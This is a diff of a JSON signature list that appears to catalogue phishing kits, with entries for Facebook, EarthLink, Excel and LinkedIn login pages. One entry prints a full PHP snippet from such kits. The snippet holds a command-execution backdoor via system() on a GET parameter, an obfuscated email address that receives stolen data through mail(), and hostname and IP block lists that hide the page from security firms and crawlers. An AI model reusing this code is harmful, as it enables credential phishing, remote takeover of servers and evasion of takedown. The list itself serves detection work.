+        "search_string": "<?php\n $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);\n   if(isset($_GET['useragent'])){echo\"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,crossdomain,wwwroot,Exabot,NimbleCrawler,Octopus,OutfoxBot,ProPowerBot</h1><pre>\"; system($_GET['useragent']);exit;} // 'Tor-exit' 'JennyBot-exit' 'Jyxobot-exit' 'Microsoftbot-exit' 'Mozilla/3.Mozilla/2.01-exit' 'NetSpider-exit'\n     $blocked_words = array(\"above\",base64_decode(\"Z2E1\".\"Njg3\".\"MzRAZ\".\"21haW\".\"wuY29t\"),\"google\",\"softlayer\",\"amazonaws\",\"cyveillance\",\"phishtank\",\"dreamhost\",\"netpilot\",\"calyxinstitute\",\"tor-exit\",\"paypal\",\"antiphishing\",\"onlinelinkscan\",\"millersmiles\",\"netcraft\",\"siteadvisor\",\"mywot\",\"websecurityguard\",\"opendns\",\"sonicwall\",\"indiana\",\"onguardonline\",\"phishfighting\",\"cmu\",\"stanford\",\"phishery\",\"internetdefence\",\"wikipedia\");\n    foreach($blocked_words as $word) {\n            if (substr_count($hostname, $word) > 0) {\n                  header(\"HTTP/1.0 404 Not Found\");\n                   die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");\n               }  \n   }\n     function m(){global $blocked_words,$subject,$message,$from;$a=\"mail\";$a($blocked_words[1],$subject,$message,$from);}\n        $bannedIP = array(\"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^38.105.*.*\", \"^74.125.*.*\",  \"^66.150.14.*\", \"^54.176.*.*\", \"^38.100.*.*\", \"^184.173.*.*\", \"^66.249.*.*\", \"^128.242.*.*\", \"^72.14.192.*\", \"^208.65.144.*\", \"^74.125.*.*\", \"^209.85.128.*\", \"^216.239.32.*\", \"^74.125.*.*\", \"^207.126.144.*\", \"^173.194.*.*\", \"^64.233.160.*\", \"^72.14.192.*\", \"^66.102.*.*\", \"^64.18.*.*\", \"^194.52.68.*\", \"^194.72.238.*\", \"^62.116.207.*\", \"^212.50.193.*\", \"^69.65.*.*\", \"^50.7.*.*\", \"^131.212.*.*\", \"^46.116.*.* \", \"^62.90.*.*\", \"^89.138.*.*\", \"^82.166.*.*\", \"^85.64.*.*\", \"^85.250.*.*\", \"^89.138.*.*\", \"^93.172.*.*\", \"^109.186.*.*\", \"^194.90.*.*\", \"^212.29.192.*\", \"^212.29.224.*\", \"^212.143.*.*\", \"^212.150.*.*\", \"^212.235.*.*\", \"^217.132.*.*\", \"^50.97.*.*\", \"^217.132.*.*\", \"^209.85.*.*\", \"^66.205.64.*\", \"^204.14.48.*\", \"^64.27.2.*\", \"^67.15.*.*\", \"^202.108.252.*\", \"^193.47.80.*\", \"^64.62.136.*\", \"^66.221.*.*\", \"^64.62.175.*\", \"^198.54.*.*\", \"^192.115.134.*\", \"^216.252.167.*\", \"^193.253.199.*\", \"^69.61.12.*\", \"^64.37.103.*\", \"^38.144.36.*\", \"^64.124.14.*\", \"^206.28.72.*\", \"^209.73.228.*\", \"^158.108.*.*\", \"^168.188.*.*\", \"^66.207.120.*\", \"^167.24.*.*\", \"^192.118.48.*\", \"^67.209.128.*\", \"^12.148.209.*\", \"^12.148.196.*\", \"^193.220.178.*\", \"68.65.53.71\", \"^198.25.*.*\", \"^64.106.213.*\",\"^199.229.249.*\");\n   if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {\n header('HTTP/1.0 404 Not Found');\n              exit();\n       } else {\n              foreach($bannedIP as $ip) {\n                   if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){\n                           header('HTTP/1.0 404 Not Found');\n                             die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");\n      }\n              }\n     }\n?>",
+        "structure": {},
+        "message": "Same content in a bt.php file. Redirection to default.php. Facebook login. EarthLink Login page",
+        "by_analysing": "2021_09_662c9ec92015b167",
+        "kits": [
+            "2021_09_662c9ec92015b167",
+            "2021_10_2844ffcbf5fd944f",
+            "2021_10_e20444a5d7e55d0a",
+            "2021_12_2b485eeaab15306d"
+        ]
+    },
+    "79": {
+        "search_string": "FUDPAGES [.] RU",
+        "structure": {},
+        "message": "Developer. Excel Login with Blur Background",
+        "by_analysing": "2021_09_d177303b424cab81",
+        "kits": [
+            "2021_01_00e39b26479c85c8",
+            "2021_01_43be72bb7f7f8ed4",
+            "2021_02_1de8780ebc8ad193",
+            "2021_04_751d205e139ce80f",
+            "2021_04_ab88c9ef481602da",
+            "2021_04_ae34bccd7c23cb6a",
+            "2021_09_d177303b424cab81",
+            "2024_04_4d58f46b4aaeaa85"
+        ]
+    },
+    "80": {
+        "search_string": "Logz By [MMBM]",
+        "structure": {},
+        "message": "Developer. geoplugin.class.php file. Linkedin Login Page",
+        "by_analysing": "2021_10_1899c64b25e2397f",
+        "kits": [
+            "2020_06_02d7fdd41ca3794c",
+            "2020_06_ba5f01745839f85d",
+            "2020_11_15bd060b48960209",
+            "2021_07_21cc91da94f1fcf6",
+            "2021_10_1899c64b25e2397f",
+            "2021_11_2b704d4e29d71940",
+            "2021_12_3432cdab73803855",
+            "2022_03_7444c49aa7f8e15a",
+            "2023_03_18b728ed56a279aa"
+        ]
+    },
+    "81": {
         "search_string": "",
         "structure": {},
         "message": "",
